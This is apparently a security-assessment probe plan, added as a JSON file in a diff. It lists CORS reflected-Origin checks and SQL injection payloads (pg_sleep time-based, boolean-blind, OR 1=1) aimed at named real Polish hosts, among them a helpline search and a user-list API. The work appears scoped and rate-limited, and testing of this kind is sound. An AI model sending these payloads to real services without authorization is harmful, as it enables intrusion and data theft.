@@ -1,0 +1,161 @@
+{
+  "_opis": "Runda 5: sweep CORS (Origin odbity + credentials) na wszystkich znanych JSON API w zakresie + testy czasowe/boolean SQLi na 116sos.pl/centres-search i science.nask.pl/api/search.",
+  "_zasady": "GET-only, 2 req/s, jeden Origin w nagłówku, żadnych danych uwierzytelniających.",
+  "checks": [
+    {
+      "id": "s5-cors-science-search",
+      "host": "science.nask.pl",
+      "method": "GET",
+      "path": "/api/search?query=raport&lang=pl",
+      "why": "CORS: czy /api/search odbija dowolny Origin (poz. 8.13, kradzież danych przy credentials).",
+      "class": "8.13",
+      "headers": {
+        "Origin": "https://arena-probe.example"
+      }
+    },
+    {
+      "id": "s5-cors-science-dl",
+      "host": "science.nask.pl",
+      "method": "GET",
+      "path": "/api/downloadFile?fileId=18864",
+      "why": "CORS na pobieraniu plików.",
+      "class": "8.13",
+      "headers": {
+        "Origin": "https://arena-probe.example"
+      }
+    },
+    {
+      "id": "s5-cors-dns-stats",
+      "host": "dns.pl",
+      "method": "GET",
+      "path": "/api/zone-stats",
+      "why": "CORS na statystykach domen.",
+      "class": "8.13",
+      "headers": {
+        "Origin": "https://arena-probe.example"
+      }
+    },
+    {
+      "id": "s5-cors-dns-count",
+      "host": "dns.pl",
+      "method": "GET",
+      "path": "/api/count-deleted-domains",
+      "why": "CORS na licznikach.",
+      "class": "8.13",
+      "headers": {
+        "Origin": "https://arena-probe.example"
+      }
+    },
+    {
+      "id": "s5-cors-116-centres",
+      "host": "116sos.pl",
+      "method": "GET",
+      "path": "/api/centres-search?q=Warszawa",
+      "why": "CORS na wyszukiwarce ośrodków (dane adresowe).",
+      "class": "8.13",
+      "headers": {
+        "Origin": "https://arena-probe.example"
+      }
+    },
+    {
+      "id": "s5-cors-116-hash",
+      "host": "116sos.pl",
+      "method": "GET",
+      "path": "/api/fetch-cookie-hash",
+      "why": "CORS na endpoincie ciasteczek.",
+      "class": "8.13",
+      "headers": {
+        "Origin": "https://arena-probe.example"
+      }
+    },
+    {
+      "id": "s5-cors-bm-news",
+      "host": "bezpiecznymiesiac.pl",
+      "method": "GET",
+      "path": "/api/news/",
+      "why": "CORS na API aktualności (CMS).",
+      "class": "8.13",
+      "headers": {
+        "Origin": "https://arena-probe.example"
+      }
+    },
+    {
+      "id": "s5-cors-da-projects",
+      "host": "dataannotation.pllum.org.pl",
+      "method": "GET",
+      "path": "/api/v1/projects/",
+      "why": "CORS na API anotacji (FastAPI) — 401 + odbity Origin z credentials = realne ryzyko.",
+      "class": "8.13",
+      "headers": {
+        "Origin": "https://arena-probe.example"
+      }
+    },
+    {
+      "id": "s5-cors-da-users",
+      "host": "dataannotation.pllum.org.pl",
+      "method": "GET",
+      "path": "/api/v1/users/",
+      "why": "CORS na liście użytkowników.",
+      "class": "8.13",
+      "headers": {
+        "Origin": "https://arena-probe.example"
+      }
+    },
+    {
+      "id": "s5-sqli-116-base",
+      "host": "116sos.pl",
+      "method": "GET",
+      "path": "/api/centres-search?q=Warszawa",
+      "why": "Baseline czasu odpowiedzi dla testów czasowych.",
+      "class": "info"
+    },
+    {
+      "id": "s5-sqli-116-sleep",
+      "host": "116sos.pl",
+      "method": "GET",
+      "path": "/api/centres-search?q=Warszawa%27%3BSELECT%20pg_sleep(5)--",
+      "why": "Time-based SQLi: czy backend czeka 5 s (PostgreSQL).",
+      "class": "4"
+    },
+    {
+      "id": "s5-sqli-116-bool",
+      "host": "116sos.pl",
+      "method": "GET",
+      "path": "/api/centres-search?q=Warszawa%27%20AND%20%271%27%3D%272",
+      "why": "Boolean-blind: inna liczba wyników niż baseline = SQLi.",
+      "class": "4"
+    },
+    {
+      "id": "s5-sqli-science-or",
+      "host": "science.nask.pl",
+      "method": "GET",
+      "path": "/api/search?query=%27%20OR%201%3D1--%20&lang=pl",
+      "why": "SQLi w wyszukiwarce CMS z poprawnym lang (poprzednio WAF uciął żądanie).",
+      "class": "4"
+    },
+    {
+      "id": "s5-science-pagenum",
+      "host": "science.nask.pl",
+      "method": "GET",
+      "path": "/api/search?query=a&lang=pl&page=-1",
+      "why": "Ujemna strona: błąd SQL/500 vs normalna obsługa.",
+      "class": "4"
+    },
+    {
+      "id": "s5-bm-postdata",
+      "host": "bezpiecznymiesiac.pl",
+      "method": "GET",
+      "path": "/post-data/",
+      "why": "Ścieżka z bundle'a (fetch) — co zwraca bez danych.",
+      "class": "info"
+    },
+    {
+      "id": "s5-zglos-sendform-post-only",
+      "host": "zglos-dezinformacje.nask.pl",
+      "method": "GET",
+      "path": "/api/sendForm",
+      "why": "Potwierdzenie 405 i nagłówków (czy jest Allow/żądanie captchy).",
+      "class": "info"
+    }
+  ]
+}
